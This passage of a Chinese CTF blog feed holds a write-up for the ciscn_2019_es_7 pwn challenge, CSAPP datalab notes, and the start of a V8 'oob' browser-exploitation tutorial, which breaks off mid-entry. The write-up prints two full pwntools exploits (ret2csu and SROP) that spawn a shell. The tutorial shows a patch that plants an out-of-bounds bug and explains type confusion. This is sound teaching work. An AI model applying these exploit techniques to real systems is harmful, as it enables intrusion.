<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7fffffffdee0</span><br><span class="line">0x7fffffffdee0:	0x6161616161616161	0x0000000000000a61#[rsp+buf]</span><br><span class="line">0x7fffffffdef0:	0x00007fffffffdf10	0x0000000000400536</span><br><span class="line">0x7fffffffdf00:	0x00007fffffffdff8	0x0000000100000000</span><br><span class="line">0x7fffffffdf10:	0x0000000000400540	0x00007ffff7a03bf7</span><br><span class="line">0x7fffffffdf20:	0x0000000000000001	0x00007fffffffdff8</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(back)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">binsh = stack - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x30 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    00000010  ed 04 40 00  00 00 00 00  0a 05 40 00  00 00 00 00  │··@·│····│··@·│····│</span><br><span class="line">    00000020  a8 43 ed d1  fe 7f 00 00  00 00 00 00  01 00 00 00  │·C··│····│····│····│</span><br><span class="line">    00000030</span><br><span class="line">[+] 0x7ffed1ed4290</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ffed1ed4290</span><br><span class="line">0x7ffed1ed4290:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x7ffed1ed42a0:	0x00007ffed1ed42a0	0x000000000040050a</span><br><span class="line">0x7ffed1ed42b0:	0x00007ffed1ed43a8	0x0000000100000000</span><br></pre></td></tr></table></figure>
<h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><p>因为需要设置3个参数，需要利用万能gadget，但是注意一点是，第一个参数只能设置低8位，但是binsh的地址有12位，所以第一个参数还需要通过pop rdi，单独设置。</p>
<ol>
<li><p>布置“/bin/sh” =&gt; 地址通过上面已经泄漏</p>
</li>
<li><p>设置rax = 59</p>
</li>
<li><p>开始ret2cus</p>
<p>part1</p>
<p>​    rbx = 0，rbp = 1，跳出循环</p>
<p>​    call []，选择binsh+0x10的地址，也就是设置rax=59</p>
<p>​    设置3个参数，都为0即可</p>
<p>part2</p>
<p>​    ‘a’×0x56=&gt; 到达ret</p>
<p>​    设置第一个参数</p>
<p>syscall即可</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39; * 2 </span><br><span class="line">payload +&#x3D; p64(mov_rax_59)</span><br><span class="line">payload +&#x3D; p64(part1) </span><br><span class="line">payload +&#x3D; p64(0) + p64(1)</span><br><span class="line">payload +&#x3D; p64(binsh+0x10)</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(0)</span><br><span class="line">payload +&#x3D; p64(part2)</span><br><span class="line">payload +&#x3D; &#39;a&#39;*56</span><br><span class="line">payload +&#x3D; p64(pop_rdi) + p64(binsh)</span><br><span class="line">payload +&#x3D; p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
<h5 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ciscn_2019_es_7"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",26076)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">mov_rax_59 = <span class="number">0x00004004E2</span></span><br><span class="line">part1 = <span class="number">0x0040059A</span></span><br><span class="line">part2 = <span class="number">0x000400580</span></span><br><span class="line">back = <span class="number">0x04004ED</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005a3</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(back)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">binsh = stack - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> * <span class="number">2</span></span><br><span class="line">payload += p64(mov_rax_59)</span><br><span class="line">payload += p64(part1) </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(binsh+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(part2)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h4><h5 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sigFrame = SigreturnFrame()</span><br></pre></td></tr></table></figure>
<h5 id="设置寄存器"><a href="#设置寄存器" class="headerlink" title="设置寄存器"></a>设置寄存器</h5><ol>
<li>rax = execve调用号</li>
<li>rdi = binsh地址</li>
<li>rsi = 0</li>
<li>rdx = 0</li>
<li>rip = syscall</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sigFrame.rax = constants.SYS_execve</span><br><span class="line">sigFrame.rdi = binsh</span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span></span><br><span class="line">sigFrame.rip = syscall</span><br></pre></td></tr></table></figure>
<h5 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h5><ol>
<li>发送“/bin/sh\x00”两个</li>
<li>gadget，这里会retn一下，让rsp下移</li>
<li>放上syscall，接着就放上str(sigFrame)【在rsp的下一个位置】</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'/bin/sh\x00'</span> * <span class="number">2</span></span><br><span class="line">payload += p64(pop_rax_15)+p64(syscall)+str(sigFrame)</span><br></pre></td></tr></table></figure>
<h5 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ciscn_2019_es_7"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",26076)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">mov_rax_59 = <span class="number">0x00004004E2</span></span><br><span class="line">part1 = <span class="number">0x0040059A</span></span><br><span class="line">part2 = <span class="number">0x000400580</span></span><br><span class="line">back = <span class="number">0x04004ED</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005a3</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(back)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">binsh = stack - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">pop_rax_15 = <span class="number">0x004004DA</span></span><br><span class="line"></span><br><span class="line">sigFrame = SigreturnFrame()</span><br><span class="line">sigFrame.rax = constants.SYS_execve</span><br><span class="line">sigFrame.rdi = binsh</span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span></span><br><span class="line">sigFrame.rip = syscall</span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> * <span class="number">2</span></span><br><span class="line">payload += p64(pop_rax_15)+p64(syscall)+str(sigFrame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本篇主要讲了些做题的点，思路更清晰了，，，，</p>
<ol>
<li>ret2csu比较好用了，这里特别注意execve使用的参数设置</li>
<li>srop主要发送str(sigFrame)在rsp下面一个，题目read和write都是[rsp+buf]为srop提供了便利</li>
</ol>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="ciscn_2019_es_7">附件</a></p>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>srop</tag>
      </tags>
  </entry>
  <entry>
    <title>datalab</title>
    <url>/2020/07/23/18-52/</url>
    <content><![CDATA[<h4 id="1-bitXor"><a href="#1-bitXor" class="headerlink" title="1.bitXor"></a>1.bitXor</h4><p>用～（取补）和&amp;实现异或操作</p>
<p><img src="/2020/07/23/18-52/image-20200720182358141.png" alt="image-20200720182358141"></p>
<h4 id="2-tmin"><a href="#2-tmin" class="headerlink" title="2.tmin"></a>2.tmin</h4><p>两字节补码的最小数</p>
<p>0111 1111 1111 1111 1111 1111 1111 1111 最大的，～x + 1，取负，负数比正数小一个</p>
<p>1000 0000 0000 0000 0000 0000 0000 0000 == 0x80000000 </p>
<p>太大了，用移位</p>
<h4 id="3-isTmax"><a href="#3-isTmax" class="headerlink" title="3.isTmax"></a>3.isTmax</h4><p>如果x是最大值，返回1，否则返回0</p>
<ul>
<li>最大值，符号位是0，其他是1，所以+1后，符号位是1，其他是0，相异或，全1,全1的反是0，0取非是1（判断是否是-1的方法）</li>
<li>除了最大值，-1也有同样的情况</li>
</ul>
<p>排除：+1后，最大值是变成另一个数，而-1是0，根据这个排除掉-1</p>
<h4 id="4-allOddBits"><a href="#4-allOddBits" class="headerlink" title="4.allOddBits"></a>4.allOddBits</h4><p>如果奇数位都是1，返回1，否则，返回0</p>
<p>让x与0xAAAAAAAA相与，如果奇数位都是1，结果是0xAAAAAAAA，再异或就是0了，否则就非0</p>
<h4 id="5-negate"><a href="#5-negate" class="headerlink" title="5.negate"></a>5.negate</h4><p>实现取反</p>
<p>-x = ~x + 1</p>
<h4 id="6-isAsciiDigit"><a href="#6-isAsciiDigit" class="headerlink" title="6.isAsciiDigit"></a>6.isAsciiDigit</h4><p>如果 0x30 &lt;= x &lt;= 0x39 ，返回1，否则，返回0</p>
<p>将x与两数相减（x - y ==  x + （～y + 1） ），判断符号位（通过右移），第一个为正，第二个为负</p>
<h4 id="7-conditional"><a href="#7-conditional" class="headerlink" title="7.conditional"></a>7.conditional</h4><p>有三个参数，x、y、z，如果x非0，返回y，否则，返回z</p>
<p>判断x是否非零：!!x</p>
<p>返回一个数：变成1，然后～x + 1变成-1（全1），然后相与</p>
<h4 id="8-isLessOrEqual"><a href="#8-isLessOrEqual" class="headerlink" title="8.isLessOrEqual"></a>8.isLessOrEqual</h4><p>三种情况</p>
<ul>
<li>符号相反，如果y为正数，为1</li>
<li>符号相同，相减 &gt; 0为1</li>
<li>两数相等（异或实现），返回1</li>
</ul>
<h4 id="9-logicalNeg"><a href="#9-logicalNeg" class="headerlink" title="9.logicalNeg"></a>9.logicalNeg</h4><p>实现取非运算，零返回1，其他返回0</p>
<p>正负零的符号位都是0</p>
<p>取反与1&amp;，正负再&amp;</p>
<h4 id="10-howManyBits"><a href="#10-howManyBits" class="headerlink" title="10.howManyBits"></a>10.howManyBits</h4><p>求共有多少位，最高位+1</p>
<p>特殊情况</p>
<ul>
<li>0 : 1</li>
<li>1 : 1</li>
</ul>
<p>正数：最高位1的位置 + 1（符号位）</p>
<p>负数：求反码，同正数</p>
<p>具体采用二分，32分成16，看高位16是否为0，非0，说明至少有16 + 1（前面的数）+ 1 （符号位），接着再8、4、2、1下去</p>
<h4 id="11-floatScale2"><a href="#11-floatScale2" class="headerlink" title="11.floatScale2"></a>11.floatScale2</h4><p>实现乘2功能。（内部使用的单精度浮点型）</p>
<p>特殊情况</p>
<ul>
<li>NaN：直接将参数返回回去</li>
<li>区别规格化数和非规格化数</li>
</ul>
<p>单精度浮点内部</p>
<p><img src="/2020/07/23/18-52/image-20200720214424119.png" alt="image-20200720214424119"></p>
<p>NaN</p>
<p><img src="/2020/07/23/18-52/image-20200720214532080.png" alt="image-20200720214532080"></p>
<p>正负无穷</p>
<p><img src="/2020/07/23/18-52/winter-blog\source\_posts\datalab\11.png" alt="11"></p>
<h4 id="12-floatFloat2Int"><a href="#12-floatFloat2Int" class="headerlink" title="12.floatFloat2Int"></a>12.floatFloat2Int</h4><p>参数的类型是unsigned，是浮点数的机器数，将其转换为该浮点数转换的int值。</p>
<p>情况：</p>
<ul>
<li><p>指数部分为为负，说明一定是零点几，直接返0</p>
</li>
<li><p>如果大于31，大了，直接返回0x80000000u</p>
</li>
<li><p>在里面，先让尾数部分加上默认的1，然后看指数是否能把所有的尾数变整</p>
<ul>
<li>E &lt; 23，说明后面还有小数部分</li>
<li>E &gt; 23，说明尾数都完整整数，还可以继续乘2^(E-23)</li>
</ul>
<p>最后，根据符号位，返回对应符号的frac</p>
</li>
</ul>
<h4 id="13-floatPower2"><a href="#13-floatPower2" class="headerlink" title="13.floatPower2"></a>13.floatPower2</h4><p>2^x（x是参数），求该值float的机器数</p>
<p>分别判断0和无穷大的情况，然后将阶码左移23位即可。</p>
<p>23是因为，阶码部分，就是尾数（23位）前面，有个默认的1</p>
<p>E = x;</p>
<p>0 | bios + E | 23个0</p>
<p><img src="/2020/07/23/18-52/winter-blog\source\_posts\datalab\13.1.png" alt="13.1"></p>
<p><img src="/2020/07/23/18-52/winter-blog\source\_posts\datalab\13.2.png" alt="13.2"></p>
<hr>
<p><img src="/2020/07/23/18-52/image-20200720222037585.png" alt="image-20200720222037585"></p>
]]></content>
      <tags>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>chrome study by v8 oob</title>
    <url>/2020/10/23/17-42/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>学习浏览器，从v8入手，这道题有比较详细的资料，作为入门题非常有优势。</p>
</blockquote>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="基础v8的环境搭建"><a href="#基础v8的环境搭建" class="headerlink" title="基础v8的环境搭建"></a>基础v8的环境搭建</h3><p>使用的环境：ubuntu  18.04</p>
<p>v8环境搭建：<a href="https://warm-winter.github.io/2020/10/11/v8环境搭建/" target="_blank" rel="noopener">https://warm-winter.github.io/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</a></p>
<h3 id="解题的搭建"><a href="#解题的搭建" class="headerlink" title="解题的搭建"></a>解题的搭建</h3><p>一般浏览器的出题有两种</p>
<ul>
<li>一种是diff修改v8引擎源代码，人为制造出一个漏洞，</li>
<li>另一种是直接采用某个cve漏洞。一般在大型比赛中会直接采用第二种方式，更考验选手的实战能力。</li>
</ul>
<p>出题者通常会提供一个diff文件，或直接给出一个编译过diff补丁后的浏览器程序。如果只给了一个diff文件，就需要我们自己去下载相关的commit源码，然后本地打上diff补丁，编译出浏览器程序，再进行本地调试。</p>
<p>比如starctf中的oob题目给出了一个diff文件：</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f 100644</span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, "fill",</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, "oob",</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, "find",</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, "findIndex",</span><br><span class="line">     [...]</span><br></pre></td></tr></table></figure>
<p>以上截取了第一部分，对/path/v8/src/bootstrapper.cc做了修改。</p>
<p>下载v8然后利用下面的命令，将diff文件加入到v8中源代码分支中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git apply &#x2F;path&#x2F;oob.diff</span><br></pre></td></tr></table></figure>
<p>我们找到<code>bootstrapper.cc</code>文件，搜索<code>SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</code>，发现下面已经将oob函数加入进去，patch成功。</p>
<p><img src="/2020/10/23/17-42/image-20201015163516782.png" alt="image-20201015163516782"></p>
<p>最后编译出增加了diff补丁的v8程序调试即可。</p>
<h3 id="环境问题"><a href="#环境问题" class="headerlink" title="环境问题"></a>环境问题</h3><p>正常来说，debug版本和release版本都能使用，但是调试这道题的时候，碰到了如下的问题：</p>
<p>release版本正常运行</p>
<p><img src="/2020/10/23/17-42/image-20201015163847582.png" alt="image-20201015163847582"></p>
<p>debug版本报错</p>
<p><img src="/2020/10/23/17-42/image-20201015163941100.png" alt="image-20201015163941100"></p>
<blockquote>
<p>e3pem师傅的博客是这样解释的：</p>
<p>了解到是DCHECK宏的问题，然而对宏修改或是注释之后发现编译出来的d8执行还是会出现问题(这个时候已经开始怀疑人生了)。后来仔细的观察了一下师傅们写的文章，发现里面调试oob的时候都是用的release版本，之前也试过release版本的d8确实不会出现问题，所以很可能debug版本的d8就是不行，而别人文章里面出现的debug版本的d8的目的就是为了了解v8的数据是怎么存储的。所以这里正确的用法应该是用release版本进行调试，用debug版本来辅助分析。</p>
</blockquote>
<h2 id="v8的基础知识"><a href="#v8的基础知识" class="headerlink" title="v8的基础知识"></a>v8的基础知识</h2><p>v8编译后二进制名称叫d8而不是v8。</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><h4 id="1-allow-natives-syntax选项"><a href="#1-allow-natives-syntax选项" class="headerlink" title="1.allow-natives-syntax选项"></a>1.allow-natives-syntax选项</h4><p>功能：定义了一些v8运行时支持函数，主要有以下两个：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%DebugPrint(obj) 输出对象地址</span><br><span class="line">%SystemBreak() 触发调试中断主要结合gdb等调试器使用</span><br></pre></td></tr></table></figure>
<p>使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;方法一</span><br><span class="line">winter@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ .&#x2F;d8 --allow-natives-syntax </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;方法二</span><br><span class="line">winter@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ gdb .&#x2F;d8 </span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test.js</span><br></pre></td></tr></table></figure>
<h4 id="2-job命令"><a href="#2-job命令" class="headerlink" title="2.job命令"></a>2.job命令</h4><p>功能：可视化显示JavaScript对象的内存结构.</p>
<p>gdb下使用：job   对象地址</p>
<p>显示如下，具体v8的内存结构，稍后“v8对象结构”里进一步解释。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; job 0x4f9d210dd59</span><br><span class="line">0x4f9d210dd59: [JSArray]</span><br><span class="line"> - map: 0x257bfd042d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x355e47bd1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x04f9d210dce9 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x26cfa9fc0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1da9ebe001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x04f9d210dce9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h4 id="3-telescope"><a href="#3-telescope" class="headerlink" title="3.telescope"></a>3.telescope</h4><p>功能：查看一下内存数据</p>
<p>使用：telescope 查看地址 （长度）</p>
<blockquote>
<p>（）表示里面的可以没有</p>
</blockquote>
<h3 id="v8知识点"><a href="#v8知识点" class="headerlink" title="v8知识点"></a>v8知识点</h3><h4 id="指针标记"><a href="#指针标记" class="headerlink" title="指针标记"></a>指针标记</h4><p>v8使用指针标记机制来区分<strong>指针</strong>，<strong>双精度数</strong>和<strong>Smis</strong>（代表）<code>immediate small integer</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Double: Shown as the 64-bit binary representation without any changes</span><br><span class="line">Smi: Represented as value &lt;&lt; 32, i.e 0xdeadbeef is represented as 0xdeadbeef00000000</span><br><span class="line">Pointers: Represented as addr &amp; 1. 0x2233ad9c2ed8 is represented as 0x2233ad9c2ed9</span><br></pre></td></tr></table></figure>
<p>所以，v8中，如果一个值表示的是指针，那么会将该值的最低bit设置为1，但其实真实的值需要减去1。</p>
<p>job直接给对象地址就行，telescope的时候，需要给真实值，需要-1。</p>
<h4 id="v8对象结构"><a href="#v8对象结构" class="headerlink" title="v8对象结构"></a>v8对象结构</h4><p>在/path/v8/out.gn/x64.debug下创建一个test.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ gdb .&#x2F;d8 </span><br><span class="line">[...]</span><br><span class="line">Reading symbols from .&#x2F;d8...done.</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test.js </span><br><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">DebugPrint: 0x31c7fffcdd59: [JSArray]</span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; job 0x31c7fffcdd59</span><br><span class="line">0x31c7fffcdd59: [JSArray]</span><br><span class="line"> - map: 0x315768442d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3f6dffcd1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x31c7fffcdce9 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x176329f00c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3ae23f8001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x31c7fffcdce9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job 0x31c7fffcdce9</span><br><span class="line">0x31c7fffcdce9: [FixedArray]</span><br><span class="line"> - map: 0x176329f00851 &lt;Map&gt;</span><br><span class="line"> - length: 3</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br></pre></td></tr></table></figure>
<p>所以，一个对象有如下属性：</p>
<ul>
<li>map：定义了如何访问对象</li>
<li>prototype：对象的原型（如果有）</li>
<li>elements：对象的地址</li>
<li>length：长度</li>
<li>properties：属性，存有map和length</li>
</ul>
<p>分析：</p>
<p>对象里存储的数据是在elements指向的内存区域的，而且是在对象的上面。也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址。</p>
<p><img src="/2020/10/23/17-42/image-20201016182850213.png" alt="image-20201016182850213"></p>
<h4 id="map属性详解"><a href="#map属性详解" class="headerlink" title="map属性详解"></a>map属性详解</h4><p>因为稍后需要用到，，所以放在这里讲一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; job 0x176329f00801</span><br><span class="line">0x176329f00801: [Map]</span><br><span class="line"> - type: FIXED_ARRAY_TYPE</span><br><span class="line"> - instance size: variable</span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - non-extensible</span><br><span class="line"> - back pointer: 0x176329f004d1 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0</span><br><span class="line"> - instance descriptors (own) #0: 0x176329f00259 &lt;DescriptorArray[0]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - prototype: 0x176329f001d9 &lt;null&gt;</span><br><span class="line"> - constructor: 0x176329f001d9 &lt;null&gt;</span><br><span class="line"> - dependent code: 0x176329f002c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure>
<p>对象的map（数组是对象）是一种数据结构，其中包含以下信息：</p>
<ul>
<li>对象的动态类型，即String，Uint8Array，HeapNumber等。</li>
<li>对象的大小（以字节为单位）</li>
<li>对象的属性及其存储位置</li>
<li>数组元素的类型，例如，unboxed的双精度数或带标记的指针</li>
<li>对象的原型（如果有）</li>
</ul>
<p>属性名称通常存储在Map中，而属性值则存储在对象本身中几个可能区域之一中。然后，map将提供属性值在相应区域中的确切位置。</p>
<p><strong>本质上，映射定义了应如何访问对象。</strong></p>
<p><strong>重点</strong></p>
<ul>
<li><p>对于对象数组：存储的是每个对象的地址</p>
</li>
<li><p>对于浮点数组：以浮点数形式存储数值</p>
</li>
</ul>
<p>所以，如果将对象数组的map换成浮点数组 =&gt; 就变成了浮点数组，会以浮点数的形式存储对象的地址；如果将对浮点组的map换成对象数组 =&gt; 就变成了对象数组，打印浮点数存储的地址。这实际上就是类型混淆的内容。</p>
<h4 id="对象和对象数组"><a href="#对象和对象数组" class="headerlink" title="对象和对象数组"></a>对象和对象数组</h4><p>有时候想着想着有点乱，调试一下。</p>
<p>一个浮点数组、整数数组和一个对象数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array = [a,b];</span><br><span class="line">%DebugPrint(obj_array);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ gdb .&#x2F;d8 </span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test.js </span><br><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">&#x2F;&#x2F;浮点数组</span><br><span class="line">DebugPrint: 0x23ddebc4de71: [JSArray]</span><br><span class="line"> - map: 0x13e6d5782ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1bb893151111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x23ddebc4de49 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1574a0580c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x19fc51e401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x23ddebc4de49 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3.3</span><br><span class="line"> &#125;</span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span 